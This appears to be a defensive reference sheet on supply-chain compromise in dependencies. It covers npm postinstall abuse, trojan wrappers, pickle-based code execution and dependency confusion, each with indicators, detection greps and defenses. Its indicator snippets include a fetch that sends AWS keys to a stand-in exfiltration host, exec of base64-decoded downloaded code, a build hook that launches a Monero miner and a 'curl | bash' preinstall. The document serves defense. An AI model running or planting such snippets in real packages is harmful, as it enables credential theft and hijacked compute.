# Attack Patterns — IOCs and Mechanisms (May 2026)

Recognizing what compromise *looks like* in dependency code. Use during pre-adoption review or when investigating a suspect package.

---

## Pattern 1: Cryptominer with delayed activation

**Mechanism**: Package looks legitimate for N days. After day 30, an import-time check (`if datetime.now() > activation_date`) downloads and runs a Monero miner.

**Concrete examples**:
- Feb 2025 ComfyUI image-enhancement pack — 500+ stars, 30-day dormancy, XMRig miner.
- May 2025 Pickai — C++ shim in PyPI wheel, ~700 ComfyUI servers compromised.
- Multiple npm 2023–25: `noblox.js`-typosquat, `colors.js` clones.

**IOCs in code**:
```python
# Time-fuse pattern
import datetime
if datetime.datetime.now() > datetime.datetime(2026, 3, 1):
    # ... activate payload
```
```python
# Dynamic download
import urllib.request, base64
exec(base64.b64decode(urllib.request.urlopen("...").read()))
```
```python
# Hidden in setup.py / pyproject build hook
def install():
    subprocess.Popen(["./xmrig", "-o", "pool.minexmr.com:443"])
```

**IOCs at runtime**:
- GPU utilization 95%+ when no jobs are running.
- Process named `xmrig`, `kdevtmpfsi`, `cpuminer`, `ccminer`, or randomly-named binary in `/tmp`.
- Outbound connections to known mining pools (NetworkMiner / `dig` against `pool.minexmr.com`, `xmrpool.eu`, `2miners.com`, `hashvault.pro`, `nanopool.org`).
- New systemd unit, cron job, or `~/.bashrc` mod.

**Detection grep**: `grep -rE 'minexmr|xmrpool|2miners|hashvault|nanopool|xmrig' .`

---

## Pattern 2: Pass-through trojan node

**Mechanism**: Package presents a useful API that simply wraps another package's function — except it also stages a stealer or backdoor as a side effect.

**Concrete examples**:
- Akira-laced `upscaler-4k` and `lonemilk-upscalernew-4k` (Oct 2025–Jan 2026) — wrapped real upscalers, ran Akira stealer in background.
- npm `event-stream` (2018) → `flatmap-stream` dependency targeted Copay Bitcoin wallet.

**IOCs in code**:
```python
# Real functionality + side effect
def upscale(image):
    import threading
    threading.Thread(target=_steal, daemon=True).start()
    return real_upscale(image)
```
```javascript
// JS variant — async fire-and-forget
function upscale(img) {
    fetch('https://exfil.example/?d=' + btoa(process.env.AWS_ACCESS_KEY_ID));
    return realUpscale(img);
}
```

**Detection grep**: any `threading.Thread(..., daemon=True)` or `setTimeout` / `setImmediate` in a node that should be pure-compute. Imports of `os.environ` / `process.env` in code that has no business with secrets.

---

## Pattern 3: Postinstall lifecycle abuse (npm-specific)

**Mechanism**: `package.json` declares `scripts.postinstall` that runs arbitrary code at `npm install` time. Even if the user never imports the package.

**Concrete examples**:
- ua-parser-js (2021) — postinstall ran a coin miner + credential stealer.
- node-ipc (2022) — postinstall wiped files for users in Russia/Belarus.
- Continuous typosquat campaigns leveraging postinstall as install-time RCE.

**IOCs in package.json**:
```json
{
  "scripts": {
    "postinstall": "node ./build.js",
    "preinstall": "curl https://... | bash"
  }
}
```

**Detection**: `jq '.scripts | with_entries(select(.key | test("install|prepare|prebuild")))' package.json`

**Defense**: `npm install --ignore-scripts` (lose convenience hooks but gain safety) or pnpm with explicit allow-list.

---

## Pattern 4: Compromised maintainer (legit package, legit publisher, legit version bump)

**Mechanism**: Attacker takes over a real maintainer's account (phishing, abandoned email, weak 2FA) and pushes a real version bump that contains the payload. There is no typosquat — it's the package you wanted, plus a payload.

**Concrete examples**:
- event-stream (2018) — original maintainer transferred ownership; new "maintainer" added flatmap-stream.
- ua-parser-js (2021) — maintainer's npm account compromised.
- coa, rc (2021) — same campaign as ua-parser-js.

**IOCs**:
- New maintainer in `Authors` section, recent.
- Version bump touches files unrelated to the changelog claim.
- Lockfile diff shows a new transitive dep from an unfamiliar maintainer.

**Defense**:
- Pin commits not version ranges. `^1.2.3` lets a hostile patch slip in; commit-pinning doesn't.
- Sigstore provenance (where supported) ties the build to a verified identity.
- Diff every dependency update, even patch bumps.

---

## Pattern 5: Pickle-based RCE (PyTorch / HF Hub specific)

**Mechanism**: `.ckpt` and `.pt` files use Python `pickle`, which executes arbitrary code on load via `__reduce__`. A malicious `.ckpt` is exactly equivalent to a malicious `.py` file you ran.

**Concrete examples**:
- `pickle` exploits documented since 2017; HF Hub introduced safetensors specifically for this reason (2022).
- Civitai `.ckpt` malware periodic findings 2023–25.
- `torchtriton` (Dec 2022, PyPI) — registry-confusion attack against PyTorch nightly.

**IOCs in pickle**:
```python
# Reading the pickle without loading it
import pickletools
pickletools.dis(open("model.ckpt", "rb").read())
# Look for GLOBAL / REDUCE opcodes referencing os.system, subprocess, builtins.eval, etc.
```

**Defense**:
- **Safetensors-only policy.** Reject `.ckpt` / `.pt` from non-canonical sources.
- For unavoidable `.ckpt`, use `pickle_module=torch.serialization._load` with restricted globals, or load in a sandbox.
- HF Hub has pickle-scanning warnings — heed them.

---

## Pattern 6: Unauthenticated control-plane abuse

**Mechanism**: The daemon exposes an API endpoint that wasn't designed to be public. Attacker mass-scans internet for the port and sends crafted payloads.

**Concrete examples**:
- April 2026 ComfyUI botnet — 1000+ instances on `--listen 0.0.0.0:8188` running unauthenticated `/prompt`. Attacker submitted a workflow that invoked a malicious custom node which downloaded a Monero miner.
- Jupyter Notebook 2018+ — same shape; mass-scan for port 8888 with empty token.
- Triton inference server 2024 — public-facing instances with no auth.

**IOCs at runtime**:
- `netstat -tlnp` shows port bound to `0.0.0.0` or `*`, not `127.0.0.1`.
- Access logs show requests from many distinct IPs.
- Workflow/job submissions you didn't initiate.

**Defense**: never bind public; reverse proxy with auth or Tailscale/VPN.

---

## Pattern 7: Dependency confusion / namespace confusion

**Mechanism**: Internal package `acme-internal` published to public PyPI/npm with a higher version number; your build pulls the public (malicious) one.

**Concrete examples**:
- Alex Birsan's 2021 disclosure (Apple, Microsoft, Tesla, etc.).
- Dozens since.

**IOCs**:
- Dependency name not scoped (`acme-utils` vs `@acme/utils`).
- Internal index with public fallback enabled.
- Lockfile shows a public registry source for what should be internal.

**Defense**:
- Scope packages (`@acme/foo`).
- Pin index URL: `pip install --index-url internal --extra-index-url public` (with care).
- Use `pip install --no-deps` + manual transitive review for sensitive deps.

---

## Pattern 8: Repo-jacking

**Mechanism**: Attacker registers a GitHub username that previously hosted a popular package after the original owner deleted/renamed. Package install URL still points to that path; new owner serves payload.

**Defense**: Pin to commit SHA, never to `main` / `master` / `latest`. Verify maintainer continuity periodically.

---

## Detection Pipeline (cheap, scriptable)

```bash
# Run on every package adoption + every update

# 1. List all "dangerous" import targets
grep -rEhn '^(from|import) +(subprocess|socket|urllib|requests|pickle|base64|ctypes|os)' --include='*.py' . | sort -u

# 2. Find postinstall hooks
find . -name 'package.json' -exec jq -r '. | select(.scripts) | .name + ": " + (.scripts | tojson)' {} \; 2>/dev/null

# 3. Suspicious URLs in code
grep -rEohn 'https?://[a-zA-Z0-9.-]+' --include='*.py' --include='*.js' . | sort -u | grep -vE 'huggingface|github|civitai|pypi|npmjs|comfy'

# 4. Base64 blobs > 200 chars
grep -rEohn '[A-Za-z0-9+/]{200,}' --include='*.py' --include='*.js' .

# 5. Pickle files (should not exist if safetensors-only)
find . -name '*.ckpt' -o -name '*.pt' -o -name '*.pkl'

# 6. Known mining-pool domains
grep -rE 'minexmr|xmrpool|2miners|hashvault|nanopool|xmrig|cryptonight' .
```

If any of these turn up something unexpected, **don't run the package**. Halt, investigate, and only proceed if you can explain every hit.

For runtime detection (after install), see `detection-runbook.md`. For incident response (after compromise), see the `comfyui-incident-response` skill.
